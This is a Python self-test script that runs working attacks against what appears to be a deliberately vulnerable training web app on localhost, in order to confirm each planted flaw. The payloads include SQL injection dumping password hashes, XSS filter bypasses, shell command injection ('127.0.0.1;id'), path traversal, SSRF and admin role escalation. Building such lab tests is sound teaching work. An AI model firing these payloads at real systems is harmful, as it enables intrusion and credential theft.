#!/usr/bin/env python3
"""
selftest.py - Automated verification of all intentional vulnerabilities.
Start the app first (python3 app.py), then run: python3 selftest.py
"""
import sys, urllib.parse
import http.client

BASE = "127.0.0.1"
PORT = 5000

def req(method, path, body=None, cookie=None):
    c = http.client.HTTPConnection(BASE, PORT, timeout=10)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body, headers)
    r = c.getresponse()
    data = r.read().decode(errors="ignore")
    setcookie = r.getheader("Set-Cookie")
    c.close()
    return r.status, data, setcookie

def login(user, pw):
    body = urllib.parse.urlencode({"username": user, "password": pw})
    status, _, sc = req("POST", "/login", body)
    return sc.split(";")[0] if sc else None

results = []
def check(name, cond):
    results.append((name, cond))
    print(("[PASS] " if cond else "[FAIL] ") + name)

ck = login("admin", "Admin@123")
check("A07 Auth - login works with parameterized query", ck is not None)

# SQLi (not on login)
inj = "x' UNION SELECT id,username,password_hash,role FROM users-- "
s, d, _ = req("GET", "/students?q=" + urllib.parse.quote(inj), cookie=ck)
check("A05 CWE-89 SQL Injection on /students search", "admin" in d)

# Stored XSS bypass
body = urllib.parse.urlencode({"name": "XSSTest", "grade": "A",
        "bio": "<script>alert(1)</script><img src=x onerror=confirm(1)>"})
req("POST", "/student/add", body, cookie=ck)
s, d, _ = req("GET", "/students", cookie=ck)
import re
sid = re.findall(r"student/(\d+)", d)[-1]
s, d, _ = req("GET", "/student/" + sid, cookie=ck)
check("A05 CWE-79 Stored XSS - <script>/alert filtered", "<script>" not in d and "alert" not in d)
check("A05 CWE-79 Stored XSS - filter bypass survives", "onerror=confirm(1)" in d)

# Reflected XSS bypass
s, d, _ = req("GET", "/search?term=" + urllib.parse.quote("<svg/onload=confirm(1)>"), cookie=ck)
check("A05 CWE-79 Reflected XSS - filter bypass", "onload=confirm(1)" in d)

# Command injection
s, d, _ = req("GET", "/ping?host=" + urllib.parse.quote("127.0.0.1;id"), cookie=ck)
check("A05 CWE-77 Command Injection on /ping", "uid=" in d)

# Path traversal
s, d, _ = req("GET", "/download?file=" + urllib.parse.quote("../app.py"), cookie=ck)
check("A01 CWE-22 Path Traversal on /download", "INTENTIONALLY VULNERABLE" in d)

# SSRF
s, d, _ = req("GET", "/fetch?url=" + urllib.parse.quote("http://127.0.0.1:5000/debug"), cookie=ck)
check("A01 CWE-918 SSRF on /fetch", s == 200)

# Priv-esc via register role
body = urllib.parse.urlencode({"username": "evil", "password": "p", "full_name": "E", "role": "admin"})
req("POST", "/register", body)
eck = login("evil", "p")
s, d, _ = req("GET", "/admin", cookie=eck)
check("A06 CWE-266 Privilege escalation via register role", s == 200)

# Weak recovery
body = urllib.parse.urlencode({"username": "student"})
s, d, _ = req("POST", "/forgot", body)
check("A07 CWE-640 Weak password recovery", "reset to" in d)

# Debug/env exposure
s, d, _ = req("GET", "/debug", cookie=ck)
check("A02 CWE-526 Env/secret exposure on /debug", "DB_ADMIN_PW" in d)

# Directory listing
s, d, _ = req("GET", "/files", cookie=ck)
check("A01 CWE-548 Directory listing on /files", s == 200)

# Verbose error (exceptional condition)
s, d, _ = req("GET", "/students?q=" + urllib.parse.quote("x'"), cookie=ck)
check("A10 CWE-755 Verbose error handling", "Query error" in d)

passed = sum(1 for _, c in results if c)
print(f"\n{passed}/{len(results)} checks passed")
sys.exit(0 if passed == len(results) else 1)
